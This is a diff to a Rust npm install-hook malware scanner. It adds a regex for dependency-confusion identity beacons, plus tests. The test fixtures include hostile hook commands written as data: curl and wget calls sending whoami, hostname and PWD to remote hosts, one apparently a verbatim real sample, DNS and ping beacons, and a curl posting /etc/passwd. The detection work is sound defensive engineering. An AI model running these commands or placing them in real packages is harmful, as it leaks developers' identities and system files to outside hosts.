@@ -75,6 +75,21 @@ fn suspicious_hook_host_pattern() -> &'static Regex {
     })
 }
 
+/// A network tool in the same command as a host-identity lookup: the
+/// dependency-confusion beacon, e.g.
+/// `curl "http://x.example/?u=$(whoami)&h=$(hostname)&d=$PWD"`, or its DNS
+/// form `nslookup $(whoami).x.example`. The corpus benchmark found 3,860
+/// Datadog samples whose only other signal was the install hook itself.
+///
+/// `uname` is left out on purpose: benign postinstalls download platform
+/// binaries with `$(uname -s)` in the URL.
+fn identity_exfil_pattern() -> &'static Regex {
+    static R: OnceLock<Regex> = OnceLock::new();
+    R.get_or_init(|| {
+        re(r#"(?i)\b(curl|wget|nslookup|dig|ping|host)\b[^;|\n]*(\$\(\s*(whoami|hostname|id)\b|`\s*(whoami|hostname|id)\b|\$\{?(USER|LOGNAME|HOSTNAME)\}?\b|/etc/(passwd|hostname)\b|%(USERNAME|COMPUTERNAME|USERDOMAIN)%)"#)
+    })
+}
+
 /// Local-script runner followed by `&& exit N` — used to make npm silently
 /// discard the hook's exit status, hiding that malware ran.
 fn silent_exit_runner_pattern() -> &'static Regex {
@@ -195,6 +210,9 @@ fn match_malware_patterns(body: &str) -> bool {
     if suspicious_hook_host_pattern().is_match(body) {
         return true;
     }
+    if identity_exfil_pattern().is_match(body) {
+        return true;
+    }
     if silent_exit_runner_pattern().is_match(body) {
         return true;
     }
@@ -261,6 +279,34 @@ mod tests {
         ];
         for s in bad {
             assert!(flags(s), "should flag: {s}");
+        }
+    }
+
+    #[test]
+    fn identity_beacons_flagged() {
+        let bad = [
+            // Datadog sample flight-debug@99.99.1, verbatim.
+            r#"{"preinstall": "curl -s \"http://sl4x0.xyz/depconf/flight-debug/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)\" > /dev/null || true"}"#,
+            r#"{"postinstall": "nslookup $(hostname).abc.oast.example"}"#,
+            r#"{"preinstall": "wget -q -O- http://x.example/?u=`whoami`"}"#,
+            r#"{"install": "curl -d @/etc/passwd http://x.example/"}"#,
+            r#"{"preinstall": "ping -n 1 %USERNAME%.%COMPUTERNAME%.x.example"}"#,
+            r#"{"postinstall": "curl http://x.example/?user=${USER}"}"#,
+        ];
+        for s in bad {
+            assert!(flags(s), "should flag: {s}");
+        }
+    }
+
+    #[test]
+    fn platform_downloads_and_plain_identity_not_flagged() {
+        let good = [
+            r#"{"postinstall": "curl -L -o bin/tool https://github.com/o/r/releases/download/v1/tool-$(uname -s)-$(uname -m)"}"#,
+            r#"{"postinstall": "echo installed for $(whoami)"}"#,
+            r#"{"postinstall": "mkdir -p $HOME/.cache/tool"}"#,
+        ];
+        for s in good {
+            assert!(!flags(s), "should NOT flag: {s}");
         }
     }
 
